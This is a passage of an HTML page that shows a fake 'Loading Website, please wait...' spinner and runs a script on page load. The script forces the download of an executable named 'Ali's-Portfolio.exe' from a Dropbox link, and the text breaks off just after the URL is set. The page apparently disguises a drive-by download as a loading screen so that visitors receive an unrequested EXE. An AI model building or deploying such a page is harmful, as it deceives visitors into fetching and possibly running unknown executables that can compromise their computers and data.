    html, body {
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #fff;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    .loader {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .spinner {
      border: 8px solid #444;
      border-top: 8px solid #fff;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .text {
      font-size: 18px;
      opacity: 0.8;
    }
  </style>
</head>
<body>
  <div class="loader">
    <div class="spinner"></div>
    <div class="text">Loading Website, please wait...</div>
  </div>

  <script>
    function forceDownload(url, filename) {
      const link = document.createElement('a');
      link.href = url;
      link.download = filename;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    window.onload = function () {
      // Trigger the EXE download
      const exeUrl = "https://www.dropbox.com/pri/get/Ali's-Portfolio.exe?_download_id=55066902160511633722228040125939095219707031696589237080418127817&_log_download_success=1&_notify_domain=www.dropbox.com&_subject_uid=869336947&w=AADVZtWHY0P_4RzrTNeh8vd-b_0dz--h77izCNxUP2evFg";
